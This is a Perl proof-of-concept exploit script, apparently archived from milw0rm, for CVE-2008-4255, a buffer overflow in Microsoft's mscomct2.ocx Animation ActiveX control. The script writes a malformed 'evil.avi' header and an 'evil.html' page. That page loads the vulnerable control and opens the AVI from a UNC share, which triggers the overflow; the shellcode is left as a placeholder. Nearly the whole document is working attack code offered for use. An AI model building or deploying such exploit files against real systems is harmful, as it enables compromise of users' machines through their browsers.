<html><head><title>MS Visual Basic ActiveX Controls mscomct2.ocx Buffer Overflow PoC</title></head><pre>#!/usr/bin/perl
# Microsoft Visual Basic ActiveX Controls mscomct2.ocx Animation Object  Buffer Overflow (CVE-2008-4255) PoC
# You'll need Debugging Tools for Windows http://www.microsoft.com/whdc/devtools/debugging/default.mspx
# /JA
# Come to FRHACK!
# www.frhack.org

print &quot;\nMicrosoft Visual Basic ActiveX Controls mscomct2.ocx Animation Object Buffer Overflow (CVE-2008-4255) PoC\n&quot;;
print &quot;Generating malicious .AVI file\n&quot;;
print &quot;This file should be served via an UNC path\n&quot;;
print &quot;[-&gt;] Building  evil.avi\n&quot;;

my $shellcode = &quot;http://metasploit.com&quot;;

$FileHeader =
&quot;\x52\x49\x46\x46\x2C\x08\x00\x00\x41\x56\x49\x20\x73\x74\x72\x68\x10\x00\x00\x00\x76\x69\x64\x73\x20\x20\x20\x20\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x73\x74\x72\x66\x00\x08\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;;

open(my $poc, &quot;&gt; evil.avi&quot;);
print $poc $FileHeader;
close($poc);

print &quot;[-&gt;] evil.avi generated\n&quot;;
print &quot;[-&gt;] Building  evil.html\n&quot;;

$EvilHTML =
&quot;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;object id='evil' classid='clsid:B09DE715-87C1-11D1-8BE3-0000F8754DA1'&gt;&lt;param name='AutoPlay' value='True'&gt;&lt;/object&gt;&quot;.
&quot;&lt;script language=javascript&gt;evil.Open('\\\\192.168.0.1\\share\\evil.avi');&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&quot;;

open(my $poc, &quot;&gt; evil.html&quot;);
print $poc $EvilHTML;
close($poc);

print &quot;[-&gt;] evil.html generated\n&quot;;

# milw0rm.com [2008-12-12]</pre></html>